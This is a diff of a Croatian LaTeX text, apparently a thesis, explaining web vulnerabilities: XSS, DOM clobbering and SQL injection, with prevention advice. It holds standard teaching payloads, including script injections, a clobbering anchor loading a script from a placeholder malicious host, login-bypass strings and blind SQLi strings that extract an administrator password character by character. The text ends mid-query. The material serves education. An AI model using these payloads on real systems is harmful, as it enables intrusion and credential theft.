 \subsection{Reflektirani XSS}
-Reflektirani XSS nastaje kada aplikacija primi podatke preko HTTP zahtjeva i ugradi ih u sljedeći odgovor, koju web aplikacija šalje, na nesiguran način. Primjerice, ako stranica sadrži funkcionalnost pretraživanja koja prima korisnički izraz za pretraživanje preko URL parametra.
+Reflektirani XSS nastaje kada aplikacija primi podatke preko HTTP zahtjeva i ugradi ih u sljedeći odgovor, koju web aplikacija šalje na nesiguran način. Primjerice, ako stranica sadrži funkcionalnost pretraživanja koja prima korisnički izraz za pretraživanje preko URL parametra.
 
 \begin{verbatim}
 https://insecure-website.com/search?term=gift
@@ -486,7 +500,7 @@ Web aplikacija inkorporira korisničke podatke na sljedeći način
 
 \begin{verbatim}
 
-You searched for: gift
+<p>You searched for: gift</p>
 
 \end{verbatim}
 
@@ -494,15 +508,18 @@ Pretpostavljajući da aplikacija ne obavlja nikakvu daljnju obradu podataka, nap
 
 \begin{verbatim}
 https://insecure-website.com/search?term=
+<script>/*+Bad+stuff+here...+*/</script>
 \end{verbatim}
 
 Na što aplikacija odgovara sa:
 
 \begin{verbatim}
+
 <p>You searched for: <script>/* Bad stuff here... */</script></p>
+
 \end{verbatim}
 
-Ako drugi korisnik aplikacije pristupi web stranici preko napadačevog URL-a, tada će se izvršiti skripta unutar žrtvinog web preglednika u kontekstu žrtvine sesije s web aplikacijom, čime se otvara mogućnost zloupotrebama web aplikacije.
+Ako drugi korisnik aplikacije pristupi web stranici preko napadačevog URL-a, tada će se izvršiti skripta unutar žrtvinog web preglednika u kontekstu žrtvine sesije, čime se otvara mogućnost zloupotrebama web aplikacije.
 
 Ako napadač može izvršiti skriptu unutar žrtvinog web preglednika, tada napadač može:
 
@@ -522,12 +539,15 @@ Pohranjeni XSS, još poznatiji pod nazivom XSS drugog stupnja ili postojani XSS 
 
 Pretpostavimo da web stranica dopušta korisniku postavljanje komentara na blog članak koji vide drugi korisnici. Korisnici svoje komentare šalju HTTP zahtjevom:
 
+\pagebreak
+
 \begin{verbatim}
 POST /post/comment HTTP/1.1
 Host: vulnerable-website.com
 Content-Length: 100
 
-postId=3&comment=This+post+was+extremely+helpful.&name=Carlos+Montoya&email=carlos%40normal-user.net
+postId=3&comment=This+post+was+extremely+helpful.
+&name=Carlos+Montoya&email=carlos%40normal-user.net
 \end{verbatim}
 
 Nakon što je komentar poslan, svaki korisnik koji pristupi tom blog članku će vidjeti sljedeće:
@@ -539,7 +559,7 @@ Nakon što je komentar poslan, svaki korisnik koji pristupi tom blog članku će
 pretpostavljajuću da aplikacija ne radi dodatnu obradu nad podatcima, napadač može poslati sljedeći maliciozan komentar:
 
 \begin{verbatim}
-
+<script>/* Bad stuff here... */</script>
 \end{verbatim}
 
 U napadačevom zahtjevu ovaj komentar bi bio URL enkodiran na sljedeći način:
@@ -551,20 +571,21 @@ comment=%3Cscript%3E%2F*%2BBad%2Bstuff%2Bhere...%2B*%2F%3C%2Fscript%3E
 Svaki korisnik koji pristupi tom članku će primiti sljedeće unutar odgovora web aplikacije:
 
 \begin{verbatim}
-
-
+<p><script>/* Bad stuff here... */</script></p>
 \end{verbatim}
 
-Čime je napadač dobio način da izvrši maliciozan kod unutar sesija svakog korisnika koji posjeti taj članak.
+Čime je napadač dobio način da izvrši maliciozan kod unutar sesije svakog korisnika koji posjeti taj članak.
 
 Korištenjem ove ranjivosti napadač može nanijeti jednaku štetu kao i s reflektiranim XSS napadom. 
 
-Što se tiče mogućnosti zloupotrebljavanja, ključna razlika između reflektiranog XSS i pohranjenog XSS je to što pohranjeni XSS ranjivosti omogućavaju napade koji su u potpunosti enkapsulirani unutar ranjive web aplikacije. To znači da napadač može navesti žrtvu da pošalje maliciozan zahtjev bez linkova ili poruka izvan ranjive web aplikacije, već napadač može postaviti takve zamke unutar same web aplikacije. 
+Što se tiče mogućnosti zloupotrebljavanja, ključna razlika između reflektiranog XSS i pohranjenog XSS je to što pohranjene XSS ranjivosti omogućavaju napade koji su u potpunosti enkapsulirani unutar ranjive web aplikacije. To znači da napadač može navesti žrtvu da pošalje maliciozan zahtjev bez linkova ili poruka izvan ranjive web aplikacije, već napadač može postaviti takve zamke unutar same web aplikacije.
+
+\pagebreak 
 
 Ugrađenost pohranjenih XSS napada u web stranicu je posebno relevantna u situacijama kada ranjivost može naštetiti samo korisnicima koji su trenutno prijavljeni na web aplikaciji. Ako je XSS napad reflektiran, tada žrtve koje nisu trenutno prijavljene u aplikaciju su zaštićene od napada jer napad mora biti dobro tajmiran, međutim ako je XSS napad pohranjen onda je osigurano da će žrtva biti prijavljena na web aplikaciju kada naiđu na maliciozan dio koda \cite{xssstor}.
 
 \subsection{DOM bazirani XSS}
-DOM baziranje XSS ranjivosti obično nastaju kada JavaScript primi podatke od izvora podatak kojeg kontrolira napadač, kao što je URL, te ih proslijedi ranjivost funkciji koja dinamično izvršavanje koda. Primjer takvih funkcija su \texttt{eval()} i \texttt{innerHTML}. Ovo omogućava napadaču izvršavanje malicioznog koda, što uobičajeno znači da napadač može preuzeti žrtvin profil na ranjivoj web aplikaciji. Vrijednost koju kontrolira napadač naziva se izvor, a funkcija koja nesigurno obrađuje podatke se zove odvod (eng. sink). Kako bi se izvršio DOM baziran XSS napad potrebno je postaviti podatke u izvor kako bi se oni propagirali do odvoda i izazvali izvršavanje malicioznog koda.
+DOM bazirane XSS ranjivosti obično nastaju kada JavaScript primi podatke od izvora podatak kojeg kontrolira napadač, kao što je URL, te ih proslijedi ranjivoj funkciji koja dinamično izvršava kod. Primjer takvih funkcija su \texttt{eval()} i \texttt{innerHTML}. Ovo omogućava napadaču izvršavanje malicioznog koda, što uobičajeno znači da napadač može preuzeti žrtvin profil na ranjivoj web aplikaciji. Vrijednost koju kontrolira napadač naziva se izvor, a funkcija koja nesigurno obrađuje podatke se zove odvod (eng. sink). Kako bi se izvršio DOM baziran XSS napad potrebno je postaviti podatke u izvor kako bi se oni propagirali do odvoda i izazvali izvršavanje malicioznog koda.
 
 Najobičniji izvor je URL, kojem se tipično pristupa preko \texttt{location} objekta. Napadač može napraviti link s malicioznim sadržajem u upitnom (eng. query string) i fragmentom dijelu URL-a.
 
@@ -575,7 +596,7 @@ if(goto.startsWith('https:')) {
 }
 \end{verbatim}
 
-Navedeni kod je ranjiv na DOM baziranu redirekciju jer \texttt{location.hash} je izvor koji je tretiran na nesiguran način. Ako URL sadrži hash fragment koji započinje sa \texttt{https:}, tada ovaj kod vrijednost svojstva \texttt{location.hash} i postavlja je kao vrijednost svojstva \texttt{location}. Napadač bi moga iskoristi ovu ranjivost koristeći sljedeći URL:
+Navedeni kod je ranjiv na DOM baziranu redirekciju jer \texttt{location.hash} je izvor koji je tretiran na nesiguran način. Ako URL sadrži hash fragment koji započinje sa \texttt{https:}, tada ovaj kod vrijednost svojstva \texttt{location.hash} postavlja kao vrijednost svojstva \texttt{location}. Napadač bi mogao iskoristi ovu ranjivost koristeći sljedeći URL:
 
 \begin{verbatim}
 https://www.innocent-website.com/example#https://www.evil-user.net
@@ -584,17 +605,17 @@ https://www.innocent-website.com/example#https://www.evil-user.net
 Kada žrtva posjeti ovaj URL, JavaScript postavi \texttt{https://www.evil-user.net} kao vrijednost svojstva \texttt{location}, što automatski preusmjerava žrtvu na malicioznu web stranicu \cite{xssdom}.
 
 \subsection{Prevencija XSS}
-Prevencija XSS napada je trivijalna u nekim slučajevima, dok je u drugim to puno teže ovisno o složenosti web aplikacije i načinu na koji ona barata s korisničkim podatcima. U većini slučajeva sprječavanje XSS ranjivosti obuhvaća više sljedećih metoda \cite{xssport}
+Prevencija XSS napada je trivijalna u nekim slučajevima, dok je u drugim to puno teže, ovisno o složenosti web aplikacije i načinu na koji ona barata s korisničkim podatcima. U većini slučajeva sprječavanje XSS ranjivosti obuhvaća više sljedećih metoda \cite{xssport}
 
 \begin{itemize}
-\item Filtriranje ulaznih podataka na ulasku. U trenutku kada se korisnički podatci prime, filtrirati ih što je strože moguće ovisno o tome što je očekivani oblik podataka.
-\item Kodiranje podataka na izlazu. Kada se korisnički podatci šalju preko HTTP odgovora, kodirati odlazne podatke kako bi se spreijčila njihova interpretacija kao aktivni sadržaj. Ovisno o kontekstu, ovo može zahtijevati kombinirano HTML, URL, JavaScript i CSS kodiranje.
+\item Filtriranje podataka na ulasku. U trenutku kada se korisnički podatci prime, potrebno ih je filtrirati što je strože moguće ovisno o tome koji je očekivani oblik podataka.
+\item Kodiranje podataka na izlazu. Kada se korisnički podatci šalju preko HTTP odgovora, kodirati odlazne podatke kako bi se spriječila njihova interpretacija kao aktivni sadržaj. Ovisno o kontekstu, ovo može zahtijevati kombinirano HTML, URL, JavaScript i CSS kodiranje.
 \item Koristiti odgovarajuće zaglavlje za odgovor. Kako bi spriječili XSS u HTTP odgovorima koji ne bi trebali sadržavati HTML ili JavaScript, mogu se koristiti \texttt{Content-Type} i \texttt{X-Content-Type-Options} zaglavlja kako bi se osiguralo da web preglednik interpretira odgovore na prihvatljiv način.
 \item Politika sigurnog sadržaja (eng.CSP-Content Security policy). Kao posljednja linija obrane može se koristiti CSP kako bi se smanjio rizik od bilo kakvih XSS ranjivosti.
 \end{itemize}
 
 \section{DOM clobbering}
-DOM clobbering je tehnika kojom je moguće ubaciti HTML u web stranicu kako bi manipulirali DOM i u konačnici promijenili ponašanje JavaScripta na stranici. DOM clobbering je posebno koristan u situacijama kada XSS napadi nisu mogući, ali je i dalje moguće kontrolirati neke HTML elemente na web stranici gdje su vrijednosti atributa \texttt{id} i \texttt{name} dopušteni kroz HTML filter. Najčešća primjena ovog napada je korištenje sidrenog (eng. anchor) elementa koji se koristi kako bi se prebrisala globalna varijabla, koju web aplikacija koristi na nesiguran način, kao što je generiranje dinamičkih skriptnih URL-a. Naziv clobbering (hrv. ugnjetavanje) dolazi iz činjenice da ugnjetavamo globalnu varijablu ili svojstvo objekta i prebrisujemo ga s DOM čvorom (eng. node) ili HTML kolekcijom. Naprimjer, mogu se koristiti DOM objekti za prebrisavanje drugih JavaScript objekata kako bi zloupotrijebili nesigurna imena, kao što je \texttt{submit}, kako bi se poremetio rad stvarne \texttt{submit()} funkcije.
+DOM clobbering je tehnika kojom je moguće ubaciti HTML u web stranicu kako bi manipulirali DOM i u konačnici promijenili ponašanje JavaScripta na stranici. DOM clobbering je posebno koristan u situacijama kada XSS napadi nisu mogući, ali je i dalje moguće kontrolirati neke HTML elemente na web stranici gdje su vrijednosti atributa \texttt{id} i \texttt{name} dopušteni kroz HTML filter. Najčešća primjena ovog napada je korištenje sidrenog (eng. anchor) elementa koji se koristi kako bi se prebrisala globalna varijabla, koju web aplikacija koristi na nesiguran način, kao što je generiranje dinamičkih skriptnih URL-a. Naziv clobbering (hrv. ugnjetavanje) dolazi iz činjenice da ugnjetavamo globalnu varijablu ili svojstvo objekta i prebrisujemo ga s DOM čvorom (eng. node) ili HTML kolekcijom. Naprimjer, mogu se koristiti DOM objekti za prebrisavanje drugih JavaScript objekata kako bi zloupotrijebili nesigurna imena, kao što je \texttt{submit}, čime bi se poremetio rad stvarne \texttt{submit()} funkcije.
 
 \subsection{Izvođenje DOM clobbering napada}
 
@@ -620,7 +641,8 @@ Ako je moguće kontrolirati neki dio HTML-a na web stranici, tada se može ugnje
 Kako bi se ovaj kod zloupotrijebio potrebno je ubaciti sljedeći HTML kako bi se ugnjetavao \texttt{someObject}:
 
 \begin{verbatim}
-
+<a id=someObject><a id=someObject name=url 
+href=//malicious-website.com/malicious.js>
 \end{verbatim}
 
 Kako dva sidrena elementa koriste isti ID, DOM ih grupira u DOM kolekciju. Rezultat ovoga je da se \texttt{someObject} prebriše s DOM kolekcijom. Atribut \texttt{name} se koristi na drugom sidrenom elementu kako bi se ugnjetavalo \texttt{url} svojstvo objekta \texttt{someObject} čime ono sad pokazuje na skriptu koja se nalazi na URL pridijeljenom \texttt{href} atributu.
@@ -628,19 +650,20 @@ Kako dva sidrena elementa koriste isti ID, DOM ih grupira u DOM kolekciju. Rezul
 Druga tehnika kojom se može napraviti DOM clobbering je korištenje \texttt{form} elementa zajedno s elementom kao što je \texttt{input} kako bi se ugnjetavala DOM svojstva. Npr. ugnjetavanjem \texttt{attributes} svojstva omogućava zaobilaženje filtera na klijentskoj strani. Iako će filter proći kroz \texttt{attributes} svojstva, on ih neće maknuti niti jedan atribut jer je to svojstvo ugnjetavano s DOM čvorom. Posljedica ovoga je mogućnost ubacivanja malicioznih atributa koji bi u normalnoj situaciji bili filtrirani, odnosno odbačeni. Za primjer uzmimo sljedeći kod:
 
 \begin{verbatim}
-
-Click me
+<form onclick=alert(1)><input id=attributes>Click me
 \end{verbatim}
 
-U ovom slučaju, filter na klijentskoj strani će proći kroz DOM i naići će na dopušteni \texttt{form} element. Normalno ponašanje filtera je da on prolazi kroz \texttt{attributes} svojstvo elementa \texttt{form} i briše one atribute koji nisu dozvoljeni. Međutim, kako je \texttt{attributes} svojstvo ugnjetavano sa \texttt{input} elementom, filter će prolaziti umjesto toga kroz \texttt{input} element. Pošto \texttt{input} element nije zatvoren, što znači da ima neodređenu duljinu, uvjet za \texttt{for} petlju filtera (kojom filter prolazi kroz atribute) se ne može postići, stoga filter jednostavno nastavi pregledavati sljedeći element. Ovo rezultira time da filter ignorira \texttt{onclick} event, što omogućava pozivanje \texttt{alert()} funkcije u web pregledniku. Ovakvo pozivanje \texttt{alert()} funkcije samo ukazuje na mjesto u kodu gdje se može staviti maliciozan kod koji bi imao učinka \cite{domnapad}.
+U ovom slučaju, filter na klijentskoj strani će proći kroz DOM i naići će na dopušteni \texttt{form} element. Normalno ponašanje filtera je da on prolazi kroz \texttt{attributes} svojstvo elementa \texttt{form} i briše one atribute koji nisu dozvoljeni. Međutim, kako je \texttt{attributes} svojstvo ugnjetavano sa \texttt{input} elementom, filter će prolaziti umjesto toga, kroz \texttt{input} element. Pošto \texttt{input} element nije zatvoren, što znači da ima neodređenu duljinu, uvjet za \texttt{for} petlju filtera (kojom filter prolazi kroz atribute) se ne može postići, stoga filter jednostavno nastavi pregledavati sljedeći element. Ovo rezultira time da filter ignorira \texttt{onclick} event, što omogućava pozivanje \texttt{alert()} funkcije u web pregledniku. Ovakvo pozivanje \texttt{alert()} funkcije samo ukazuje na mjesto u kodu gdje se može staviti maliciozan kod koji bi imao učinka \cite{domnapad}.
 
 \subsection{Prevencija ranjivosti DOM clobbering}
-Najjednostavniji način sprječavanja DOM clobbering napada je provjerom funkcija i objekata kojom se utvrđuje da oni imaju očekivani oblik. Npr. može se provjeriti dali atributi svojstva DOM čvora su instance \texttt{NameNodeMap}. Ovime se osigurava da je neko svojstvo uistinu atribut svojstva, a ne ugnjetavani HTML element. Također, preporučuje se izbjegavanje korištenja globalnih varijabli zajedno s logičkim operatorom ILI, tj. \texttt{||}, jer to može dovesti do DOM clobbering ranjivosti \cite{domclob}.
+Najjednostavniji način sprječavanja DOM clobbering napada je provjerom funkcija i objekata kojom se utvrđuje da oni imaju očekivani oblik. Npr. može se provjeriti dali atributi svojstva DOM čvora su instance \texttt{NameNodeMap} objekta. Ovime se osigurava da je neko svojstvo uistinu atribut svojstva, a ne ugnjetavani HTML element. Također, preporučuje se izbjegavanje korištenja globalnih varijabli zajedno s logičkim operatorom ILI, tj. \texttt{||}, jer to može dovesti do DOM clobbering ranjivosti \cite{domclob}.
 
 \section{SQL injection}
-SQL ubacivanje (eng.SQLi-SQL injection) je web ranjivost koja omogućava napadaču da poremetiti upite koje web aplikacija šalje bazi podataka. U većini slučajeva, ova ranjivost napadaču daje uvid u podatke koji normalno nisu dostupni. Ti podatci mogu uključivati podatke drugih korisnika ili bilo koje druge podatke kojima web aplikacija ima pristup. U nekim slučajevima napadač može promijeniti ili izbrisati podatke čime se može uzrokovati trajne promjene u sadržaju web aplikacije ili njenom ponašanju. U iznimnim slučajevima napadač može ugroziti sami server na kojem se nalazi baza podataka,  neki drugi dio back-end infrastrukture ili izvršiti napad za odbijanje usluge (eng. DOS-Denial Of Service).
+SQL ubacivanje (eng.SQLi-SQL injection) je web ranjivost koja omogućava napadaču da poremetiti upite koje web aplikacija šalje bazi podataka. U većini slučajeva, ova ranjivost napadaču daje uvid u podatke koji normalno nisu dostupni. Ti podatci mogu uključivati podatke drugih korisnika ili bilo koje druge podatke kojima web aplikacija ima pristup. U nekim slučajevima napadač može promijeniti ili izbrisati podatke čime se mogu uzrokovati trajne promjene u sadržaju web aplikacije ili njenom ponašanju. U iznimnim slučajevima napadač može ugroziti sami server na kojem se nalazi baza podataka,  neki drugi dio back-end infrastrukture ili izvršiti napad za odbijanje usluge (eng. DOS-Denial Of Service).
 
-Postoje različite SQLi ranjivosti, napadi i tehnike koji se mogu iskoristiti u različitim situacijama. Neki od uobičajenih primjera uključuju \cite{sitesqli}
+\pagebreak
+
+Postoje različite SQLi ranjivosti, napadi i tehnike koji se mogu iskoristiti u različitim situacijama. Neki od uobičajenih primjera uključuju: \cite{sitesqli}
 
 \begin{itemize}
 \item Dohvaćanje skrivenih podataka, koje se postiže promjenom SQL upita kako bi vratio dodatne informacije
@@ -675,7 +698,7 @@ Ovo će rezultirati SQL upitom:
 SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
 \end{verbatim}
 
-Ključna stvar je da se u SQL znak dvostrukog minusa \texttt{--} shvaća kao indikator komentara, što znači da se ostatak upita tretira kao komentar. Ovime se odstranjuje ostatak upita, što znači da on sada ne sadrži \texttt{AND released = 1}. Ovo znači da će biti prikazani svi proizvodi, uključujući i one koji nisu u prodaji. Također, napadač može prikazati sve proizvode u svim kategorijama sljedećim URL-om:
+Ključna stvar je da se u SQL-u znak dvostrukog minusa \texttt{--} shvaća kao indikator komentara, što znači da se ostatak upita tretira kao komentar. Ovime se odstranjuje ostatak upita, što znači da on sada ne sadrži \texttt{AND released = 1}. Ovo znači da će biti prikazani svi proizvodi, uključujući i one koji nisu u prodaji. Također, napadač može prikazati sve proizvode u svim kategorijama sljedećim URL-om:
 
 \begin{verbatim}
 https://insecure-website.com/products?category=Gifts'+OR+1=1--
@@ -687,13 +710,13 @@ https://insecure-website.com/products?category=Gifts'+OR+1=1--
 SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
 \end{verbatim}
 
-Promijenjeni upit će vratiti sve proizvode koji su u kategoriji "Gifts" ili 1 je jednako 1. Kako je \texttt{1=1} uvijek istinitom upit će vratiti sve proizvode \cite{sitesqli}.
+Promijenjeni upit će vratiti sve proizvode koji su u kategoriji "Gifts" ili 1 je jednako 1. Kako je \texttt{1=1} uvijek istinit, upit će vratiti sve proizvode \cite{sitesqli}.
 
 \subsection{Potkopavanje logike web aplikacije}
 Uzmimo za primjer web aplikaciju koja korisnicima omogućava prijavljivanje s korisničkim imenom i lozinkom. Ako korisnik pošalje korisničko ime \texttt{peter} i lozinku \texttt{cheese}, web aplikacija izvršava sljedeći upit kojim se provjerava valjanost danih podataka:
 
 \begin{verbatim}
-SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
+SELECT * FROM users WHERE username = 'peter' AND password = 'bluecheese'
 \end{verbatim}
 
 Ako upit vrati detalje korisnika, tada je korisnik valjan, u suprotnom, pokušaj prijave je odbijen. Ovdje se napadač može prijaviti bez lozinke nadodavanjem komentara \texttt{--} kako bi makao dio upita koji provjerava lozinku. Kako bi se ovo ostvarilo potrebno je samo upisati \texttt{administrator'--} za korisničko ime i ostaviti praznu lozinku, što će rezultirati sljedećim upitom:
@@ -726,14 +749,14 @@ Nakon otkrivanja SQLi ranjivosti, korisno je dobiti informacije o samoj bazi pod
 SELECT * FROM v$version
 \end{verbatim}
 
-Također je moguće odrediti koje tablice baze podataka postoje i koje stupce one sadrže. Npr. većina baza podataka ako se izvrši sljedeći upit, baza podataka će vratiti listu tablica \cite{sitesqli}:
+Također je moguće odrediti koje tablice baze podataka postoje i koje stupce one sadrže. Npr. većina baza podataka, ako se izvrši sljedeći upit, vraća listu tablica \cite{sitesqli}:
 
 \begin{verbatim}
 SELECT * FROM information_schema.tables
 \end{verbatim}
 
 \subsection{Slijepi SQLi}
-Slijepi SQLi napadi su mogući kada je web aplikacija ranjiva na SQLi, ali HTTP odgovor ne sadrži nikakav rezultat upita ili detalja pogrešaka baze podataka. S ovakvim ranjivostima, mnoge tehnike, kao što su UNION napadi, nisu učinkovite jer se one zasnivaju na tome da je napadač u mogućnosti vidjeti rezultate ubačenog upita u odgovoru web aplikacije. Međutim, i dalje je moguće zloupotrijebiti slijepi SQLi kako bi se dobio pristup zaštićenim podatcima, ali su za to potrebne druge tehnike. Neke od tih tehnika su:
+Slijepi SQLi napadi su mogući kada je web aplikacija ranjiva na SQLi, ali HTTP odgovor ne sadrži nikakav rezultat upita ili detalje pogrešaka baze podataka. S ovakvim ranjivostima, mnoge tehnike, kao što su UNION napadi, nisu učinkovite jer se one zasnivaju na tome da je napadač u mogućnosti vidjeti rezultate ubačenog upita u odgovoru web aplikacije. Međutim, i dalje je moguće zloupotrijebiti slijepi SQLi kako bi se dobio pristup zaštićenim podatcima, ali su za to potrebne druge tehnike. Neke od tih tehnika su:
 
 \begin{itemize}
 \item Slijepi SQLi uzrokovan uvjetnim odgovorom
@@ -752,10 +775,11 @@ Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
 Kada se zahtjev koji sadrži \texttt{TrackingId} obrađuje, web aplikacija određuje dali se radi o poznatom korisniku tako što izvrši sljedeći SQL upit:
 
 \begin{verbatim}
-SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
+SELECT TrackingId FROM TrackedUsers 
+WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
 \end{verbatim}
 
-Ovaj upit je ranjiv na SQLi, ali rezultati upita se vračaju korisniku. Međutim, web aplikacija se ponaša drugačije ovisno o tome dali upit vrača podatke. Ako upit vraća podatke, jer je \texttt{TrackingId} poznat web aplikaciji, onda se na stranici prikazuje "Dobrodošli natrag" poruka. Ovo ponašanje je dovoljno da bi se mogao izvršiti slijepi SQLi napad kojim bi se izvukle informacije, time što bi se pojavili drugačiji odgovori ovisno o ubačenom uvjetu. Kako bi vidjeli kako ovo funkcionira, pretpostavimo da su poslana dva zahtjeva koja sadrže sljedeće vrijednosti \texttt{TrackingId} kolačića:
+Ovaj upit je ranjiv na SQLi, ali rezultati upita se ne vračaju korisniku. Međutim, web aplikacija se ponaša drugačije ovisno o tome dali upit vrača podatke. Ako upit vraća podatke, jer je \texttt{TrackingId} poznat web aplikaciji, onda se na stranici prikazuje "Dobrodošli natrag" poruka. Ovo ponašanje je dovoljno da bi se mogao izvršiti slijepi SQLi napad kojim bi se izvukle informacije, time što bi se pojavili drugačiji odgovori ovisno o ubačenom uvjetu. Da bi se vidjelo kako ovo funkcionira, pretpostavimo da su poslana dva zahtjeva koja sadrže sljedeće vrijednosti \texttt{TrackingId} kolačića:
 
 \begin{verbatim}
 xyz' UNION SELECT 'a' WHERE 1=1--
@@ -765,27 +789,30 @@ xyz' UNION SELECT 'a' WHERE 1=2--
 Prva vrijednost će uzrokovati upit da vrati rezultat, jer je ubačeni uvjet \texttt{1=1} je točan, stoga će se prikazati "Dobrodošli natrag" poruka. Dok u slučaju druge vrijednosti, upit neće vratiti rezultat, jer je ubačeni uvjet \texttt{1=2} netočan, pa se poruka "Dobrodošli natrag" neće prikazati. Ovo omogućava određivanje odgovora na bilo koji ubačeni uvjet, što znači da se podatci mogu izvlačiti dio po dio. Npr. pretpostavimo da postoji tablica imena \texttt{Users} sa stupcima \texttt{Username} i \texttt{Password} te da postoji korisnik zvan \texttt{Administrator}. U ovom slučaju je moguće odrediti lozinku korisnika slanjem niza unosa kako bi testirali lozinku jedno po jedno slovo. Kako bi ovo napravili počnemo sa sljedećim unosom:
 
 \begin{verbatim}
-xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) > 'm'--
+xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' 
+and SUBSTRING(Password, 1, 1) > 'm'--
 \end{verbatim}
 
 Ovaj unos vraća "Dobrodošli natrag" poruku, koja ukazuje na to da je ubačeni uvjet točan, stoga je prvo slovo lozinke veće od \texttt{m}. Zatim, šaljemo sljedeće:
 
 \begin{verbatim}
-xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) > 't'--
+xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' 
+and SUBSTRING(Password, 1, 1) > 't'--
 \end{verbatim}
 
 Ovaj unos ne vrača poruku "Dobrodošli natrag", što ukazuje da je ubačeni uvjet netočan, stoga je prvo slovo lozinke veće od \texttt{t}. Na kraju, šaljemo sljedeći unos koji prikazuje poruku "Dobrodošli natrag", što je potvrda da je prvo slovo lozinke \texttt{s}:
 
 \begin{verbatim}
-xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) = 's'--
+xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' 
+and SUBSTRING(Password, 1, 1) = 's'--
 \end{verbatim}
 
 Ovim postupkom nastavljamo sve dok ne saznamo sva slova lozinke za korisnika \texttt{Administrator}.
 
 \subsubsection{Prouzrokovanje uvjetnih odgovora stvaranjem SQL grešaka}
-U prethodnim primjerima, pretpostavimo li da web aplikacija izvršava isti SQL upit, ali se njeno ponašanje ne mijenja ovisno o tome dali upit vraća podatke. U ovom slučaju prethodna tehnika ne bi funkcionirala jer ubacivanjem točnih ili netočnih uvjeta ne čini razliku web aplikaciji po pitanju odgovora kojeg vraća korisniku.
+Pretpostavimo li da web aplikacija izvršava isti SQL upit, iz prethodnog primjer, ali se njeno ponašanje ne mijenja ovisno o tome dali upit vraća podatke, navedene tehnike ne daju rezultate. U ovom slučaju prethodna tehnika ne bi funkcionirala jer ubacivanjem točnih ili netočnih uvjeta ne čini razliku u web aplikaciji po pitanju odgovora kojeg ona vraća korisniku.
 
-U ovoj situaciji je često moguće prouzročiti uvjetni odgovor uzrokovanjem uvjetnih SQL grešaka. Ovo zahtjeva promjenu upita tako da on uzrokuje grešku baze podataka ako je uvjet ispunjen. Neobrađena greška koji javlja baza podataka može uzrokovati odgovor web aplikacije preko kojega napadač može saznati istinitost ubačenog uvjeta.
+U ovoj situaciji je često moguće prouzročiti uvjetni odgovor uzrokovanjem uvjetnih SQL grešaka. Ovo zahtjeva promjenu upita tako da on uzrokuje grešku baze podataka, ako je uvjet ispunjen. Neobrađena greška koju javlja baza podataka može uzrokovati odgovor web aplikacije preko kojega napadač može saznati istinitost ubačenog uvjeta.
 
 Za primjer uzmimo dva zahtjeva koja sadrže sljedeće \texttt{TrackingId} vrijednosti:
 
@@ -794,15 +821,16 @@ xyz' UNION SELECT CASE WHEN (1=2) THEN 1/0 ELSE NULL END--
 xyz' UNION SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END--
 \end{verbatim}
 
-Ovi unosi koriste ključnu riječ \texttt{CASE} kako bi se testirao uvjet i time vratile različiti izrazi ovisno dali je uvjet istinit. Kod prvog unosa, izraz poprima vrijednost \texttt{null}, koji ne uzrokuje grešku. Drugi unos, izraz poprima vrijednost \texttt{1/0}, koji uzrokuje grešku dijeljenja s nulom. Pretpostavljajući da greška uzrokuje razliku u HTTP odgovoru web aplikacije, iz te razlike može se zaključiti dali je uvjet istinit.
+Ovi unosi koriste ključnu riječ \texttt{CASE} kako bi se testirao uvjet i time vratili različiti izrazi ovisno dali je uvjet istinit. Kod prvog unosa, izraz poprima vrijednost \texttt{null}, koji ne uzrokuje grešku. Kod drugog unosa, izraz poprima vrijednost \texttt{1/0}, koji uzrokuje grešku dijeljenja s nulom. Pretpostavljajući da greška uzrokuje razliku u HTTP odgovoru web aplikacije, iz te razlike može se zaključiti dali je uvjet istinit.
 
-Koristeći ovu tehniku, moguće je dohvatiti podatke na način koji je opisan u prethodnoj tehnici, a to je da sistematski testiramo slovo po slovo:
+Koristeći ovu tehniku, moguće je dohvatiti podatke na način koji je opisan u prethodnoj tehnici, a to je da se sistematski testia slovo po slovo:
 
 \begin{verbatim}
-xyz' UNION SELECT CASE WHEN (username = 'Administrator' and SUBSTRING(password, 1, 1) > 'm') THEN 1/0 ELSE null END FROM users--
+xyz' UNION SELECT CASE WHEN (username = 'Administrator' 
+and SUBSTRING(password, 1, 1) > 'm') THEN 1/0 ELSE null END FROM users--
 \end{verbatim}
 
-\subsubsection{Slijepi SQLi uzrokokvan vremenskim kašnjenjem}
+\subsubsection{Slijepi SQLi uzrokovan vremenskim kašnjenjem}
 Pretpostavimo da web aplikacije iz prethodnog primjera hvata greške baze podataka te ih po pravilu obrađuje. U ovakvoj situaciji, uzrokovanje greške baze podataka umetanjem SQL upita neće izazvati nikakvu razliku u ponašanju web aplikacije, stoga je prethodno opisana tehnika beskorisna.
 
 U ovakvoj situaciji, često je moguće zloupotrijebiti slijepu SQLi ranjivost uzrokovanjem uvjetnih vremenskih kašnjenja. Pošto se SQL upiti uglavnom izvršavaju sinkrono, uvođenjem kašnjenja u njihovom izvršavanju će ujedno uzrokovati kašnjenje HTTP odgovora web aplikacije. Ovime je moguće odrediti istinitost ubačenog uvjeta na temelju vremena potrebnog prije nego što primimo HTTP odgovor web aplikacije.
@@ -819,11 +847,12 @@ Prvi unos neće uzrokovati vremensko kašnjenje jer je uvjet \texttt{1=2} netoč
 Koristeći ovu tehniku moguće je izvući podatke iz baze podataka tako da testiramo svako slovo podatke kojeg dohvaćamo:
 
 \begin{verbatim}
-'; IF (SELECT COUNT(username) FROM Users WHERE username = 'Administrator' AND SUBSTRING(password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
+'; IF (SELECT COUNT(username) FROM Users WHERE username = 'Administrator' 
